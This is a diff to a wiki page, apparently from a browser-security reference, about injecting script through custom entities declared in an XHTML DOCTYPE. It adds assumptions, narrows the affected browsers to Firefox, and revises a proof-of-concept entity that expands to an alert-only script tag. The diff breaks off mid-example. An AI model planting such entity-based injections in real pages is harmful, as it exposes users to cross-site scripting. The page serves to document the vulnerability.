@@ -15,16 +15,25 @@ XML allows [http://www.w3.org/TR/REC-xml/#NT-EntityDecl definition of entities] 
 Other problems with entity definitions are described at XsrfViaXxe.
 
 
+==Assumptions==
+Untrusted parties can specify entity declarations to include in the DOCTYPE of an HTML or XHTML file and they can generate markup using those entities.
+  or
+User defined entities exist and they can be spliced together to construct unsafe markup.
+
+
 ==Versions==
-All XHTML browsers including at least IE6, Firefox, Safari, and Opera.
+Firefox and possibly others.
 
 
 ==Example==
 {{{
-<!DOCTYPE html [
-<!ENTITY inject "&#60;script&#62;alert('boo')&#60;/script&#62;">
-]> 
-<html>
+<!DOCTYPE html
+  PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"
+[
+  <!ENTITY inject "&#60;script&#62;alert(1)&#60;/script&#62;">
+]>
+<html xmlns="http://www.w3.org/1999/xhtml">
   <head><title/></head>
   <body>
     &inject;
